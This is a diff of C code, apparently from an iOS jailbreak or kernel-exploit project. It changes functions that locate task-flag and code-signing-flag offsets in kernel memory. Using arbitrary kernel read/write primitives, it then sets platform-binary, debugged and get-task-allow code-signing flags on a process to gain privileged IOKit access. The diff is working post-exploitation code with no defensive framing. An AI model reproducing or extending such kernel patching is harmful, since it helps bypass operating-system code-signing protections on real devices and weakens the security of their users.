@@ -352,7 +352,26 @@ static uint32_t find_task_offset(uint64_t proc) {
     return (uint32_t)procsize;
 }
 
-static uint32_t find_task_flags_offset(uint64_t task) {
+static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOut) {
+    if (taskCsflagsOffOut) {
+        *taskCsflagsOffOut = 0;
+    }
+
+    uint32_t savedTaskFlagsOff = (uint32_t)gettaskflagsoffset();
+    uint32_t savedTaskCsflagsOff = (uint32_t)gettaskcsflagsoffset();
+    if (savedTaskFlagsOff && savedTaskFlagsOff < 0x1000) {
+        uint32_t flags = ds_kread32(task + savedTaskFlagsOff);
+        uint32_t csOff = savedTaskCsflagsOff ? savedTaskCsflagsOff : (savedTaskFlagsOff + 4);
+        uint32_t cs = ds_kread32(task + csOff);
+
+        if ((flags & 0xffff0000U) == 0 && (cs & CS_VALID) && !(cs & 0xf0000000U)) {
+            if (taskCsflagsOffOut) {
+                *taskCsflagsOffOut = csOff;
+            }
+            return savedTaskFlagsOff;
+        }
+    }
+
     uint64_t launchd = procbypid(1);
     uint64_t launchdTask = 0;
 
@@ -378,9 +397,15 @@ static uint32_t find_task_flags_offset(uint64_t task) {
         if (launchdTask) {
             uint32_t launchdFlags = ds_kread32(launchdTask + off);
             if (launchdFlags & 0x00000400U) {
+                if (taskCsflagsOffOut) {
+                    *taskCsflagsOffOut = off + 4;
+                }
                 return off;
             }
         } else {
+            if (taskCsflagsOffOut) {
+                *taskCsflagsOffOut = off + 4;
+            }
             return off;
         }
     }
@@ -504,24 +529,35 @@ static int prepareIOKitAccess(void) {
     bool hadNonCriticalFailures = false;
     kernel_logf("prepareIOKitAccess: skipping ucred mutations on this device");
 
-    uint32_t tfOff = find_task_flags_offset(task);
+    uint32_t taskCsOff = 0;
+    uint32_t tfOff = find_task_flags_offset(task, &taskCsOff);
     if (tfOff) {
+        if (taskCsOff) {
+            kernel_logf("prepareIOKitAccess: task flags offset = 0x%x, task csflags offset = 0x%x", tfOff, taskCsOff);
+        }
+
         uint32_t tf = ds_kread32(task + tfOff);
         uint32_t newTf = tf | 0x400;
         ds_kwrite32(task + tfOff, newTf);
-        if (ds_kread32(task + tfOff) != newTf) {
+        uint32_t verifiedTf = ds_kread32(task + tfOff);
+        kernel_logf("prepareIOKitAccess: task flags before=0x%x after=0x%x", tf, verifiedTf);
+        if (verifiedTf != newTf) {
             kernel_logf("prepareIOKitAccess: task flags verify failed (non-critical)");
             hadNonCriticalFailures = true;
         }
 
-        uint32_t taskCsOff = tfOff + 4;
+        if (!taskCsOff) {
+            taskCsOff = tfOff + 4;
+        }
         uint32_t taskCs = ds_kread32(task + taskCsOff);
         uint32_t newTaskCs = taskCs |
             CS_PLATFORM_BINARY |
             CS_DEBUGGED |
             CS_GET_TASK_ALLOW;
         ds_kwrite32(task + taskCsOff, newTaskCs);
-        if (ds_kread32(task + taskCsOff) != newTaskCs) {
+        uint32_t verifiedTaskCs = ds_kread32(task + taskCsOff);
+        kernel_logf("prepareIOKitAccess: task csflags before=0x%x after=0x%x", taskCs, verifiedTaskCs);
+        if (verifiedTaskCs != newTaskCs) {
             kernel_logf("prepareIOKitAccess: task csflags verify failed (non-critical)");
             hadNonCriticalFailures = true;
         }
